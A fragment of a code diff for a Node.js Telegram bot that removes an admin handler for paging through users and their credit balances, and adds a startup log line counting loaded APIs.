-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-
-    // All users pagination
-    if (data.startsWith('allusers_')) {
-        const page = parseInt(data.split('_')[1]);
-        const state = userStates.get(chatId);
-        if (state && state.state === 'allusers') {
-            const start = page * state.perPage;
-            const end = start + state.perPage;
-            const chunk = state.users.slice(start, end);
-            let msg = '👥 **ALL USERS**\n\n';
-            chunk.forEach(u => {
-                msg += `🆔 \`${u._id}\` | @${u.username || 'no_username'} | 💰${u.credits}\n`;
-            });
-            msg += `\nPage ${page+1}/${state.totalPages}`;
-            const markup = {
-                inline_keyboard: [
-                    ...(page > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${page-1}` }] : []),
-                    ...(page < state.totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${page+1}` }] : [])
-                ]
-            };
-            bot.editMessageText(msg, { chat_id: chatId, message_id: callbackQuery.message.message_id, parse_mode: 'Markdown', reply_markup: markup });
-            state.page = page;
-            userStates.set(chatId, state);
-        }
-        bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-});
-
 // ---------- ERROR HANDLING ----------
 bot.on('polling_error', (err) => console.log(err));
 
 console.log('🤖 Bot started successfully!');
+console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);
 
 // ---------- WEB SERVER ----------
 const express = require('express');
